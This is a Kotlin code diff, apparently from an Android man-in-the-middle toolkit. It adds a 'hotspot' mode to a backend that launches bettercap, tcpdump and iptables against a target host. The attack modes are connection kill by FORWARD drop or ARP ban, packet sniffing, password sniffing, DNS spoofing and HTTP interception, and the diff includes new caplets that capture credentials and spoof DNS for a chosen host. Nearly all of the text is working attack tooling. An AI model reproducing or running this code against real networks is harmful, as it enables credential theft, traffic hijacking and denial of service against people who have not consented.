@@ -36,7 +36,7 @@ class ExternalToolMitmBackend(
     override fun loadSession(): MitmSession {
         val record = sessionStore.loadRecord()
             ?: return MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
-        val active = record.pids.isNotEmpty() && record.pids.any(::isProcessAlive)
+        val active = record.pids.any(::isProcessAlive) || record.forwardDropTargetHost.isNotBlank()
         if (!active) {
             sessionStore.clear()
             return MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
@@ -57,7 +57,7 @@ class ExternalToolMitmBackend(
                 summary = resourceProvider.getString(R.string.mitm_interface_required)
             )
         }
-        val gatewayAddress = if (requiresGateway(request.mode)) {
+        val gatewayAddress = if (requiresGateway(request.mode, request.networkMode)) {
             validateIpv4(request.gatewayAddress)
                 ?: return MitmActionResult(
                     success = false,
@@ -75,7 +75,7 @@ class ExternalToolMitmBackend(
                 summary = ""
             )
         )
-        val missingToolSummary = missingToolSummary(request.mode, readiness)
+        val missingToolSummary = missingToolSummary(request.mode, request.networkMode, readiness)
         if (missingToolSummary != null) {
             return MitmActionResult(success = false, summary = missingToolSummary)
         }
@@ -90,23 +90,30 @@ class ExternalToolMitmBackend(
         var artifactPath = ""
         var redirectPort = 0
         var forwardingEnabled = false
+        var forwardDropTargetHost = ""
 
         try {
             when (request.mode) {
                 MitmMode.CONNECTION_KILL -> startConnectionKill(
                     config = config,
+                    networkMode = request.networkMode,
                     interfaceName = interfaceName,
                     targetHost = targetHost,
                     sessionDirectory = sessionDirectory,
                     logFile = mainLogFile,
                     pidList = pidList
-                )
+                ).also { appliedForwardDrop ->
+                    if (appliedForwardDrop) {
+                        forwardDropTargetHost = targetHost
+                    }
+                }
 
                 MitmMode.SNIFFER -> {
                     artifactPath = File(sessionDirectory, "capture.pcap").absolutePath
                     forwardingEnabled = true
                     startSniffer(
                         config = config,
+                        networkMode = request.networkMode,
                         interfaceName = interfaceName,
                         targetHost = targetHost,
                         gatewayAddress = gatewayAddress,
@@ -122,6 +129,7 @@ class ExternalToolMitmBackend(
                     forwardingEnabled = true
                     startPasswordSniffer(
                         config = config,
+                        networkMode = request.networkMode,
                         interfaceName = interfaceName,
                         targetHost = targetHost,
                         gatewayAddress = gatewayAddress,
@@ -136,6 +144,7 @@ class ExternalToolMitmBackend(
                     forwardingEnabled = true
                     startDnsSpoof(
                         config = config,
+                        networkMode = request.networkMode,
                         interfaceName = interfaceName,
                         targetHost = targetHost,
                         gatewayAddress = gatewayAddress,
@@ -158,6 +167,7 @@ class ExternalToolMitmBackend(
                     artifactPath = startHttpMitmMode(
                         request = request,
                         config = config,
+                        networkMode = request.networkMode,
                         targetHost = targetHost,
                         interfaceName = interfaceName,
                         gatewayAddress = gatewayAddress,
@@ -169,10 +179,10 @@ class ExternalToolMitmBackend(
                 }
             }
         } catch (exception: IllegalArgumentException) {
-            cleanupSession(pidList, redirectPort, forwardingEnabled)
+            cleanupSession(pidList, redirectPort, forwardingEnabled, forwardDropTargetHost)
             return MitmActionResult(success = false, summary = exception.message.orEmpty())
         } catch (_: Exception) {
-            cleanupSession(pidList, redirectPort, forwardingEnabled)
+            cleanupSession(pidList, redirectPort, forwardingEnabled, forwardDropTargetHost)
             return MitmActionResult(
                 success = false,
                 summary = resourceProvider.getString(R.string.mitm_session_start_failed)
@@ -198,7 +208,8 @@ class ExternalToolMitmBackend(
                 session = session,
                 pids = pidList,
                 redirectPort = redirectPort,
-                forwardingEnabled = forwardingEnabled
+                forwardingEnabled = forwardingEnabled,
+                forwardDropTargetHost = forwardDropTargetHost
             )
         )
 
@@ -217,7 +228,12 @@ class ExternalToolMitmBackend(
                 session = MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
             )
 
-        cleanupSession(record.pids, record.redirectPort, record.forwardingEnabled)
+        cleanupSession(
+            record.pids,
+            record.redirectPort,
+            record.forwardingEnabled,
+            record.forwardDropTargetHost
+        )
         sessionStore.clear()
 
         return MitmActionResult(
@@ -340,25 +356,40 @@ class ExternalToolMitmBackend(
 
     private fun startConnectionKill(
         config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
         interfaceName: String,
         targetHost: String,
         sessionDirectory: File,
         logFile: File,
         pidList: MutableList<Long>
-    ) {
-        val pid = startBettercapCaplet(
-            config = config,
-            name = "connection_kill",
-            interfaceName = interfaceName,
-            sessionDirectory = sessionDirectory,
-            logFile = logFile,
-            capletContent = buildArpBanCaplet(targetHost)
-        ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-        pidList += pid
+    ): Boolean {
+        return when (networkMode) {
+            ConnectionBlockMode.NORMAL -> {
+                val pid = startBettercapCaplet(
+                    config = config,
+                    name = "connection_kill",
+                    interfaceName = interfaceName,
+                    sessionDirectory = sessionDirectory,
+                    logFile = logFile,
+                    capletContent = buildArpBanCaplet(targetHost)
+                ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
+                pidList += pid
+                false
+            }
+
+            ConnectionBlockMode.HOTSPOT -> {
+                if (!applyForwardDrop(targetHost)) {
+                    throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
+                }
+                logFile.writeText("FORWARD DROP active for $targetHost on $interfaceName\n")
+                true
+            }
+        }
     }
 
     private fun startSniffer(
         config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
         interfaceName: String,
         targetHost: String,
         gatewayAddress: String,
@@ -368,15 +399,18 @@ class ExternalToolMitmBackend(
         pidList: MutableList<Long>
     ) {
         setForwarding(true)
-        val bettercapPid = startBettercapCaplet(
-            config = config,
-            name = "spoof_relay",
-            interfaceName = interfaceName,
-            sessionDirectory = sessionDirectory,
-            logFile = logFile,
-            capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
-        )
-        bettercapPid?.let(pidList::add)
+        val bettercapPid = if (networkMode == ConnectionBlockMode.NORMAL) {
+            startBettercapCaplet(
+                config = config,
+                name = "spoof_relay",
+                interfaceName = interfaceName,
+                sessionDirectory = sessionDirectory,
+                logFile = logFile,
+                capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
+            ).also { it?.let(pidList::add) }
+        } else {
+            null
+        }
         val tcpdumpPid = startDetachedProcess(
             name = "tcpdump_capture",
             sessionDirectory = sessionDirectory,
@@ -384,13 +418,14 @@ class ExternalToolMitmBackend(
             body = buildTcpdumpScript(config, interfaceName, targetHost, artifactPath)
         )
         tcpdumpPid?.let(pidList::add)
-        if (bettercapPid == null || tcpdumpPid == null) {
+        if ((networkMode == ConnectionBlockMode.NORMAL && bettercapPid == null) || tcpdumpPid == null) {
             throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
         }
     }
 
     private fun startPasswordSniffer(
         config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
         interfaceName: String,
         targetHost: String,
         gatewayAddress: String,
@@ -405,7 +440,11 @@ class ExternalToolMitmBackend(
             interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
             logFile = File(artifactPath),
-            capletContent = buildPasswordSniffCaplet(targetHost, gatewayAddress)
+            capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
+                buildPasswordSniffCaplet(targetHost, gatewayAddress)
+            } else {
+                buildHotspotPasswordSniffCaplet(targetHost)
+            }
         )
         bettercapPid?.let(pidList::add)
         if (bettercapPid == null) {
@@ -415,6 +454,7 @@ class ExternalToolMitmBackend(
 
     private fun startDnsSpoof(
         config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
         interfaceName: String,
         targetHost: String,
         gatewayAddress: String,
@@ -435,7 +475,11 @@ class ExternalToolMitmBackend(
             interfaceName = interfaceName,
             sessionDirectory = sessionDirectory,
             logFile = logFile,
-            capletContent = buildDnsSpoofCaplet(targetHost, gatewayAddress, artifactPath)
+            capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
+                buildDnsSpoofCaplet(targetHost, gatewayAddress, artifactPath)
+            } else {
+                buildHotspotDnsSpoofCaplet(targetHost, artifactPath)
+            }
         )
         bettercapPid?.let(pidList::add)
         if (bettercapPid == null) {
@@ -446,6 +490,7 @@ class ExternalToolMitmBackend(
     private fun startHttpMitmMode(
         request: MitmLaunchRequest,
         config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
         targetHost: String,
         interfaceName: String,
         gatewayAddress: String,
@@ -472,19 +517,26 @@ class ExternalToolMitmBackend(
 
         setForwarding(true)
         applyPortRedirect(redirectPort)
-        val bettercapPid = startBettercapCaplet(
-            config = config,
-            name = "http_relay",
-            interfaceName = interfaceName,
-            sessionDirectory = sessionDirectory,
-            logFile = logFile,
-            capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
-        ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
-        pidList += bettercapPid
+        if (networkMode == ConnectionBlockMode.NORMAL) {
+            val bettercapPid = startBettercapCaplet(
+                config = config,
+                name = "http_relay",
+                interfaceName = interfaceName,
+                sessionDirectory = sessionDirectory,
+                logFile = logFile,
+                capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
+            ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
+            pidList += bettercapPid
+        }
         return artifactPath
     }
 
-    private fun cleanupSession(pids: List<Long>, redirectPort: Int, forwardingEnabled: Boolean) {
+    private fun cleanupSession(
+        pids: List<Long>,
+        redirectPort: Int,
+        forwardingEnabled: Boolean,
+        forwardDropTargetHost: String
+    ) {
         pids.forEach { pid ->
             shellRepository.execute(
                 command = "kill -15 $pid 2>/dev/null || true; sleep 1; kill -0 $pid 2>/dev/null && kill -9 $pid 2>/dev/null || true",
@@ -501,6 +553,9 @@ class ExternalToolMitmBackend(
         }
         if (forwardingEnabled) {
             setForwarding(false)
+        }
+        if (forwardDropTargetHost.isNotBlank()) {
+            clearForwardDrop(forwardDropTargetHost)
         }
     }
 
@@ -567,15 +622,25 @@ class ExternalToolMitmBackend(
         )
     }
 
-    private fun missingToolSummary(mode: MitmMode, readiness: MitmReadiness): String? {
+    private fun missingToolSummary(
+        mode: MitmMode,
+        networkMode: ConnectionBlockMode,
+        readiness: MitmReadiness
+    ): String? {
         return when (mode) {
             MitmMode.CONNECTION_KILL ->
-                if (!readiness.bettercapAvailable) resourceProvider.getString(R.string.mitm_missing_bettercap) else null
+                when (networkMode) {
+                    ConnectionBlockMode.NORMAL ->
+                        if (!readiness.bettercapAvailable) resourceProvider.getString(R.string.mitm_missing_bettercap) else null
+                    ConnectionBlockMode.HOTSPOT ->
+                        if (!readiness.iptablesAvailable) resourceProvider.getString(R.string.mitm_missing_iptables) else null
+                }
 
             MitmMode.SNIFFER ->
                 when {
-                    !readiness.bettercapAvailable -> resourceProvider.getString(R.string.mitm_missing_bettercap)
                     !readiness.tcpdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_tcpdump)
+                    networkMode == ConnectionBlockMode.NORMAL && !readiness.bettercapAvailable ->
+                        resourceProvider.getString(R.string.mitm_missing_bettercap)
                     else -> null
                 }
 
@@ -594,9 +659,10 @@ class ExternalToolMitmBackend(
             MitmMode.CUSTOM_FILTER,
             MitmMode.SESSION_HIJACK ->
                 when {
-                    !readiness.bettercapAvailable -> resourceProvider.getString(R.string.mitm_missing_bettercap)
                     !readiness.iptablesAvailable -> resourceProvider.getString(R.string.mitm_missing_iptables)
                     !readiness.mitmdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_mitmdump)
+                    networkMode == ConnectionBlockMode.NORMAL && !readiness.bettercapAvailable ->
+                        resourceProvider.getString(R.string.mitm_missing_bettercap)
                     else -> null
                 }
         }
@@ -713,6 +779,17 @@ sleep 31536000
 """.trimIndent()
     }
 
+    private fun buildHotspotPasswordSniffCaplet(targetHost: String): String {
+        return """
+set events.stream.output stdout
+set net.sniff.local false
+set net.sniff.verbose false
+set net.sniff.filter "host $targetHost and not arp"
+net.sniff on
+sleep 31536000
+""".trimIndent()
+    }
+
     private fun buildDnsSpoofCaplet(targetHost: String, gatewayAddress: String, hostsFilePath: String): String {
         return """
 set events.stream.output stdout
@@ -727,7 +804,22 @@ sleep 31536000
 """.trimIndent()
     }
 
-    private fun requiresGateway(mode: MitmMode): Boolean {
+    private fun buildHotspotDnsSpoofCaplet(targetHost: String, hostsFilePath: String): String {
+        return """
+set events.stream.output stdout
+set net.sniff.local false
+set net.sniff.filter "host $targetHost and not arp"
+set dns.spoof.all false
+set dns.spoof.hosts ${hostsFilePath}
+dns.spoof on
+sleep 31536000
+""".trimIndent()
+    }
+
+    private fun requiresGateway(mode: MitmMode, networkMode: ConnectionBlockMode): Boolean {
+        if (networkMode == ConnectionBlockMode.HOTSPOT) {
+            return false
+        }
         return when (mode) {
             MitmMode.CONNECTION_KILL -> false
             MitmMode.SNIFFER,
